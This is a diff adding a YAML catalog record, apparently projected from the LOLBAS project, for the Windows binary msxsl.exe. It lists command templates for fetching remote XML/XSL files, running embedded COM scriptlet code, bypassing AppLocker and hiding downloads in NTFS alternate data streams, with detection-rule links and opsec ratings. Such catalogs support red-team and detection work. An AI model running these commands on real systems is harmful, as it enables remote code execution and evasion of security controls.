@@ -1,0 +1,115 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL01zeHNsLnltbA/QURT/5
+type: binary
+platform: windows
+name: msxsl.exe
+phases:
+- defense-evasion
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1564
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
+  - https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
+  - https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+commands:
+- template: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
+  comment: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: msxsl.exe
+      category: ADS
+      privileges: User
+      mitre_id: T1564
+      source_file: OtherMSBinaries/Msxsl.yml
+      command_source_index: 5
+      document_utf8: "---\nName: msxsl.exe\nDescription: Command line utility used to perform XSL transformations.\n\
+        Author: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: msxsl.exe {PATH:.xml} {PATH:.xsl}\n\
+        \    Description: Run COM Scriptlet code within the script.xsl file (local).\n    Usecase: Local\
+        \ execution of script stored in XSL file.\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1220\n    OperatingSystem: Windows\n    Tags:\n      - Execute: XSL\n  - Command: msxsl.exe\
+        \ {PATH:.xml} {PATH:.xsl}\n    Description: Run COM Scriptlet code within the script.xsl file\
+        \ (local).\n    Usecase: Local execution of script stored in XSL file.\n    Category: AWL Bypass\n\
+        \    Privileges: User\n    MitreID: T1220\n    OperatingSystem: Windows\n    Tags:\n      - Execute:\
+        \ XSL\n  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}\n    Description: Run COM Scriptlet\
+        \ code within the shellcode.xml(xsl) file (remote).\n    Usecase: Local execution of remote script\
+        \ stored in XSL script stored as an XML file.\n    Category: Execute\n    Privileges: User\n \
+        \   MitreID: T1220\n    OperatingSystem: Windows\n    Tags:\n      - Execute: XSL\n      - Execute:\
+        \ Remote\n  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}\n    Description: Run COM Scriptlet\
+        \ code within the shellcode.xml(xsl) file (remote).\n    Usecase: Local execution of remote script\
+        \ stored in XSL script stored as an XML file.\n    Category: AWL Bypass\n    Privileges: User\n\
+        \    MitreID: T1220\n    OperatingSystem: Windows\n    Tags:\n      - Execute: XSL\n      - Execute:\
+        \ Remote\n  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}\n    Description:\
+        \ Using remote XML and XSL files, save the transformed XML file to disk.\n    Usecase: Download\
+        \ a file from the internet and save it to disk.\n    Category: Download\n    Privileges: User\n\
+        \    MitreID: T1105\n    OperatingSystem: Windows\n  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}\
+        \ -o {PATH}:ads-name\n    Description: Using remote XML and XSL files, save the transformed XML\
+        \ file to an Alternate Data Stream (ADS).\n    Usecase: Download a file from the internet and\
+        \ save it to an NTFS Alternate Data Stream.\n    Category: ADS\n    Privileges: User\n    MitreID:\
+        \ T1564\n    OperatingSystem: Windows\nFull_Path:\n  - Path: no default\nDetection:\n  - Sigma:\
+        \ https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml\n\
+        Resources:\n  - Link: https://twitter.com/subTee/status/877616321747271680\n  - Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker\n\
+        \  - Link: https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file\nAcknowledgement:\n\
+        \  - Person: Casey Smith\n    Handle: '@subtee'\n  - Person: Ronnie Salomonsen\n    Handle: '@r0ns3n'\n"
+      document_sha256: sha256:339c8396b6126f07ac10b99acf1d98425481f633ed2593c394c737e25d5cc148
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1564
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:fd0d3b9fd2b34e7cc6c5aef3448d815d0ea98ad3f77d51a7af6e2bced00bbec6
